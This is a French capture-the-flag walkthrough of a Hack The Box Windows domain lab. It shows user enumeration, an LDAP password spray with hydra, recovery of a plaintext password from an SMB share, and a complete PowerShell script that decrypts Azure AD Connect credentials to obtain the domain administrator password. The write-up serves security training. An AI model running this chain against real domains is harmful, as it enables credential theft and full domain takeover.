# 10.10.10.172

# Reco

`ping 10.10.10.172`                                                       

```
64 bytes from 10.10.10.172: icmp_seq=2 ttl=127 time=450 ms
64 bytes from 10.10.10.172: icmp_seq=3 ttl=127 time=23.4 ms
```

`sudo nmap -Pn -sV -vvv -p- -oA nmap/10.10.10.172_sS 10.10.10.172`

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-01-14 14:44:21Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  unknown       syn-ack ttl 127
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  unknown       syn-ack ttl 127
49671/tcp open  unknown       syn-ack ttl 127
49703/tcp open  unknown       syn-ack ttl 127
49780/tcp open  unknown       syn-ack ttl 127
```

La machine expose de nombreux ports dont LDAP, Kerberos, SMB et RPC

# Ports
## RPC

`rpcclient -U "" 10.10.10.172`

```
Unable to initialize messaging context
Enter WORKGROUP\'s password: 
rpcclient $> srvinfo
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000000
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

Connexion anonyme possible en RPC, nous permet de récupérer la liste des utilisateurs systèmes

## SMB
### Accés anonyme

`enum4linux -a 10.10.10.172`

```
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
```

```
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
```

Enum4linux nous confirme les noms d'utilisateur, et nous indique la présente d'un groupe `Azure Admins`

### Accés utilisateur

On accéde aux shares SMB via le compte `SABatchJobs`

`smbclient -U 'SABatchJobs' \\\\10.10.10.172\\users$`

```
Unable to initialize messaging context
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \>
smb: \> cd mhope
smb: \mhope\> ls
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (16,7 KiloBytes/sec) (average 16,7 KiloBytes/sec)
```

```XML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
``` 

- Ce mot de passe est probablement le mot de passe du compte `mhope` puisque présent dans son dossier. 
- Le compte `mhope` fait partis des Adm Azure (cf enum4linux) et le fichier XML est dans son home.
    - Ce mot de passe permet de se connecter via SMB

## LDAP

`ldapsearch -x -h 10.10.10.172 -s base namingcontexts`

```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

- On utilise l'ensemble des noms d'utilisateurs comme mot de passe et on brute force en LDAP. On sait qu'on est en LDAPv3 grace a ldapsearch

`hydra -s 3268 -L users.txt -P pwd.txt 10.10.10.172 ldap3 -V`

```
[3268][ldap3] host: 10.10.10.172   login: SABatchJobs   password: SABatchJobs
```

Récupération du compte `SABatchJobs\SABatchJobs`

## WinRM

La connexion via WinRM est possible en utilisant le compte `mhope`

`evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'`

```
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents>
*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
```

L'utilisateur `mhope` appartient au groupe `Azure Admins` - Vous pouvez aussi utiliser `whoami /all`

```
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
[...]
Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users         
```

Après quelques recherches sur des élévations de priviléges avec un compte `Azure Admins` on tombe sur cet article :

- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/

On utilise le script powershell du 1er lien 

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> $client = new-object System.Data.SqlClient.SqlConnection
*Evil-WinRM* PS C:\Users\mhope\Documents> $PASS='4n0therD4y@n0th3r$'
*Evil-WinRM* PS C:\Users\mhope\Documents> $client.Connectionstring= "Server=LocalHost;Database=ADSync;Trusted_Connection=True;uid=mhope;pwd=$PASS;"
*Evil-WinRM* PS C:\Users\mhope\Documents> $client.Open()
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Read() | Out-Null
*Evil-WinRM* PS C:\Users\mhope\Documents> $key_id = $reader.GetInt32(0)
*Evil-WinRM* PS C:\Users\mhope\Documents> $instance_id = $reader.GetGuid(1)
*Evil-WinRM* PS C:\Users\mhope\Documents> $entropy = $reader.GetGuid(2)
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Close()
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:\Users\mhope\Documents> $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Read() | Out-Null
*Evil-WinRM* PS C:\Users\mhope\Documents> $config = $reader.GetString(0)
*Evil-WinRM* PS C:\Users\mhope\Documents> $crypted = $reader.GetString(1)
*Evil-WinRM* PS C:\Users\mhope\Documents> $reader.Close()
*Evil-WinRM* PS C:\Users\mhope\Documents> add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
*Evil-WinRM* PS C:\Users\mhope\Documents> $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
*Evil-WinRM* PS C:\Users\mhope\Documents> $km.LoadKeySet($entropy, $instance_id, $key_id)
*Evil-WinRM* PS C:\Users\mhope\Documents> $key = $null
*Evil-WinRM* PS C:\Users\mhope\Documents> $km.GetActiveCredentialKey([ref]$key)
*Evil-WinRM* PS C:\Users\mhope\Documents> $key2 = $null
*Evil-WinRM* PS C:\Users\mhope\Documents> $km.GetKey(1, [ref]$key2)
*Evil-WinRM* PS C:\Users\mhope\Documents> $decrypted = $null
*Evil-WinRM* PS C:\Users\mhope\Documents> $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
*Evil-WinRM* PS C:\Users\mhope\Documents> $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\Users\mhope\Documents> $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:\Users\mhope\Documents> $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
```


```
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Domain: " + $domain.Domain)
Domain: MEGABANK.LOCAL
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Username: " + $username.Username)
Username: administrator
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Password: " + $password.Password)
Password: d0m@in4dminyeah!
```

```
evil-winrm -i 10.10.10.172 -u 'Administrator' -p 'd0m@in4dminyeah!'
Evil-WinRM shell v2.0
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir ..\Desktop
Directory: C:\Users\Administrator\Desktop
          1/3/2020   5:48 AM             32 root.txt
```

# Proof

- User : `4961976bd7dXXXXXXXXXX705e2f212f2`
- Root : `12909612d25XXXXXXXXXX7d1a804a0bc`
